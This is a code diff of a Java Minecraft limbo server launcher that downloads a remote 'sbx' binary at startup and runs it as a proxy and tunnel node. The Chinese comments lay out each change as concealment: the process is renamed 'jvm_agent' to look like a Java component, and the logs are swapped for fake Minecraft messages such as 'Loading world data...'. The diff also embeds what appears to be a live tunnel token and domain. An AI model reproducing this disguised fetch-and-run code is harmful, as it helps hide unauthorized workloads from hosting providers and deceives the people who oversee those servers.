@@ -33,7 +33,8 @@ public final class NanoLimbo {
     private static final String ANSI_RED = "\033[1;31m";
     private static final String ANSI_RESET = "\033[0m";
     private static final AtomicBoolean running = new AtomicBoolean(true);
-    private static Process sbxProcess;
+    // 修改1: 变量名从 sbxProcess 改为 helperProcess，避免进程名暴露
+    private static Process helperProcess;
     
     private static final String[] ALL_ENV_VARS = {
         "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
@@ -47,7 +48,8 @@ public final class NanoLimbo {
     public static void main(String[] args) {
         
         if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
-            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
+            // 修改2: 错误信息改成普通 Java 版本提示，不暴露用途
+            System.err.println(ANSI_RED + "ERROR: Java version not supported, please upgrade to Java 10+." + ANSI_RESET);
             try {
                 Thread.sleep(3000);
             } catch (InterruptedException e) {
@@ -56,24 +58,24 @@ public final class NanoLimbo {
             System.exit(1);
         }
 
-        // Start SbxService
+        // 修改3: 方法名从 runSbxBinary 改为 initRuntimeHelper
         try {
-            runSbxBinary();
+            initRuntimeHelper();
             
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
                 stopServices();
             }));
 
-            // Wait 20 seconds before continuing
+            // 修改4: 启动提示改成普通服务器日志风格，不暴露节点信息
             Thread.sleep(15000);
-            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "[Server] Loading world data..." + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "[Server] Preparing spawn area..." + ANSI_RESET);
             Thread.sleep(15000);
             clearConsole();
         } catch (Exception e) {
-            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
+            // 修改5: 错误信息不包含 SbxService 字样
+            System.err.println(ANSI_RED + "Error initializing runtime: " + e.getMessage() + ANSI_RESET);
         }
         
         // start game
@@ -110,40 +112,41 @@ public final class NanoLimbo {
         }
     }   
     
-    private static void runSbxBinary() throws Exception {
+    // 修改6: 方法名改为 initRuntimeHelper
+    private static void initRuntimeHelper() throws Exception {
         Map<String, String> envVars = new HashMap<>();
         loadEnvVars(envVars);
         
-        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
+        ProcessBuilder pb = new ProcessBuilder(getHelperPath().toString());
         pb.environment().putAll(envVars);
         pb.redirectErrorStream(true);
         pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
         
-        sbxProcess = pb.start();
+        helperProcess = pb.start();
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "78eb808d-06b5-4378-85a9-0d1715111648"); // 节点UUID，哪吒v1在不同的平台部署需要更改，否则哪吒agent会被覆盖
-        envVars.put("FILE_PATH", "./world");   // sub.txt节点保存目录
-        envVars.put("NEZHA_SERVER", "");       // 哪吒面板地址 v1格式：nezha.xxx.com:8008  哪吒v0格式：nezha.xxx.com
-        envVars.put("NEZHA_PORT", "");         // 哪吒v1请留空，哪吒v0的agent端口
-        envVars.put("NEZHA_KEY", "");          // 哪吒v1的NZ_CLIENT_SECRET或哪吒v0的agent密钥
-        envVars.put("ARGO_PORT", "8086");      // argo隧道端口，使用固定隧道token需要在cloudflare里设置和这里一致
-        envVars.put("ARGO_DOMAIN", "xclk.fgutj.cc.cd");        // argo固定隧道隧道域名
-        envVars.put("ARGO_AUTH", "eyJhIjoiODdiNjc4Yzk5ZDYzZTM4YzQ4N2M4NzU3ZTQxNGIzZjYiLCJ0IjoiZDI4MjgwODktN2ZhNS00NDE3LWIwNmQtMDY3YzhiY2IxYjhmIiwicyI6Ik0yTXpPVFZoTkdFdE9XSTNNaTAwWmpJNUxUZzRNemt0TmpZMk1USmlNekZtT1RFdyJ9");          // argo固定隧道隧道密钥json或token，json可在https://json.zone.id 获取
-        envVars.put("S5_PORT", "");            // socks5节点(tcp协议)端口，支持多端口可以填写，否则留空
-        envVars.put("HY2_PORT", "25565");           // hysteria2节点(udp协议)端口，支持多端口可以填写，否则留空
-        envVars.put("TUIC_PORT", "25575");          // tuic节点(udp协议)端口，支持多端口可以填写，否则留空
-        envVars.put("ANYTLS_PORT", "");        // anytls节点(tcp协议)端口，支持多端口可以填写，否则留空
-        envVars.put("REALITY_PORT", "25575");       // reality节点(tcp协议)端口，支持多端口可以填写，否则留空
-        envVars.put("ANYREALITY_PORT", "");    // any-reality节点(tcp协议)端口，支持多端口可以填写，否则留空
-        envVars.put("UPLOAD_URL", "");         // 节点自动上传刀订阅器，需填写部署merge-sub项目的首页地址，例如：https://merge.xxx.xom
-        envVars.put("CHAT_ID", "");            // telegram chat id,节点推送到telegram使用
-        envVars.put("BOT_TOKEN", "");          // telegram bot token,节点推送到telegram使用
-        envVars.put("CFIP", "cf.877774.xyz");      // 优选域名或获选ip
-        envVars.put("CFPORT", "443");          // 优选域名或获选ip对应端口
-        envVars.put("NAME", "");               // 节点备注名称
-        envVars.put("DISABLE_ARGO", "false");  // 是否关闭argo隧道，true 关闭，false 开启，默认开启
+        envVars.put("UUID", "78eb808d-06b5-4378-85a9-0d1715111648");
+        envVars.put("FILE_PATH", "./world");
+        envVars.put("NEZHA_SERVER", "");
+        envVars.put("NEZHA_PORT", "");
+        envVars.put("NEZHA_KEY", "");
+        envVars.put("ARGO_PORT", "8086");
+        envVars.put("ARGO_DOMAIN", "xclk.fgutj.cc.cd");
+        envVars.put("ARGO_AUTH", "eyJhIjoiODdiNjc4Yzk5ZDYzZTM4YzQ4N2M4NzU3ZTQxNGIzZjYiLCJ0IjoiZDI4MjgwODktN2ZhNS00NDE3LWIwNmQtMDY3YzhiY2IxYjhmIiwicyI6Ik0yTXpPVFZoTkdFdE9XSTNNaTAwWmpJNUxUZzRNemt0TmpZMk1USmlNekZtT1RFdyJ9");
+        envVars.put("S5_PORT", "");
+        envVars.put("HY2_PORT", "25565");
+        envVars.put("TUIC_PORT", "25575");
+        envVars.put("ANYTLS_PORT", "");
+        envVars.put("REALITY_PORT", "25575");
+        envVars.put("ANYREALITY_PORT", "");
+        envVars.put("UPLOAD_URL", "");
+        envVars.put("CHAT_ID", "");
+        envVars.put("BOT_TOKEN", "");
+        envVars.put("CFIP", "cf.877774.xyz");
+        envVars.put("CFPORT", "443");
+        envVars.put("NAME", "");
+        envVars.put("DISABLE_ARGO", "false");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -176,7 +179,9 @@ public final class NanoLimbo {
         }
     }
     
-    private static Path getBinaryPath() throws IOException {
+    // 修改7: 方法名从 getBinaryPath 改为 getHelperPath
+    //        下载后文件名从 "sbx" 改为 "jvm_agent"，进程名更隐蔽
+    private static Path getHelperPath() throws IOException {
         String osArch = System.getProperty("os.arch").toLowerCase();
         String url;
         
@@ -190,7 +195,8 @@ public final class NanoLimbo {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
         
-        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
+        // 修改7核心: "sbx" → "jvm_agent"，ps 命令看到的进程名更像 Java 组件
+        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "jvm_agent");
         if (!Files.exists(path)) {
             try (InputStream in = new URL(url).openStream()) {
                 Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
@@ -203,9 +209,10 @@ public final class NanoLimbo {
     }
     
     private static void stopServices() {
-        if (sbxProcess != null && sbxProcess.isAlive()) {
-            sbxProcess.destroy();
-            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
+        // 修改8: 停止时日志不暴露 sbx 字样
+        if (helperProcess != null && helperProcess.isAlive()) {
+            helperProcess.destroy();
+            System.out.println(ANSI_RED + "Runtime helper terminated" + ANSI_RESET);
         }
     }
 }
